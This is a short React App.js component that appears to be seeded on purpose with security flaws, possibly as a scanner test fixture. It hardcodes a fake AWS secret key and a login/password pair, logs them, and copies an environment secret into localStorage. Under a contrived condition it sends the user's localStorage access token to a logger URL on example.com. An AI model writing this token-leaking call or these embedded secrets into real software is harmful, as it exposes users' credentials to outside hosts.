import React from 'react'
import logo from './logo.svg'
import './App.css'
import { getLocation } from './Location'
// import { Client } from 'pg'
import process from 'process'

function App() {
  const { hostname, pathname } = getLocation()
  console.log('A')
  console.log('B')
  const AWS_SECRET_ACESS_KEY = '21321dshiushIPQBN!I@#ibdbsdsa'
  const teste = {
    login: 'douglas',
    password: 'teste.js',
  }
  console.log(teste)
  const db = localStorage.setItem('DBBASE', process?.env?.AWS_SECRET_ACESS_KEY)
  console.log(db)
  if (
    process?.env?.AWS_SECRET_ACESS_KEY &&
    process?.env?.AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY &&
    AWS_SECRET_ACESS_KEY === AWS_SECRET_ACESS_KEY
  ) {
    alert('Unexpected Condition')
    fetch(
      'http://example.com/logger.php?token=' + localStorage?.access_token,
    ).then((response) => {
      localStorage.setItem('teste', response?.body)
      console.log({ localStorage })
    })
  }
  return (
    <div className="App">
      <header className="App-header">
        <img src={logo} className="App-logo" alt="logo" />
        <p data-cy="location">
          {hostname} {pathname}{' '}
        </p>
      </header>
    </div>
  )
}

export default App
